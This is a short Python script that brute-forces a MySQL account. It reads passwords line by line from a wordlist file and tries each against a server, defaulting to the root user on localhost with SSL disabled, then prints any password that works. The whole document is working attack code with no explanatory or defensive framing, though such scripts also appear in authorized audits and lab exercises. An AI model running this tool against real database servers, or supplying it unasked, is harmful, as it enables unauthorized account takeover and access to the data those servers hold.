import mysql.connector
from mysql.connector import Error

def attempt_login(host, user, password):
    conn = None  
    try:
        mysql_config = {
          'user':user,
          'password':password,
          'host':host,
          'ssl_disabled':True
        }
        # Attempt to connect to the MySQL database with the given password
        conn = mysql.connector.connect(**mysql_config)
        if conn.is_connected():
            print(f"Success! Password is: {password}")
            return True
    except Error as e:
        # If connection fails, print error message (optional)
        # print(f"Error: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def brute_force(host, user, password_file):
    password_found = False
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if attempt_login(host, user, password):
                password_found = True
                break  # Stop after finding the correct password
    if not password_found:
        print("No password found in the file.")

if __name__ == "__main__":
    # Path to the file containing passwords
    host = 'localhost'
    user = 'root'
    password_file = 'passwords.txt'

    brute_force(host, user, password_file)
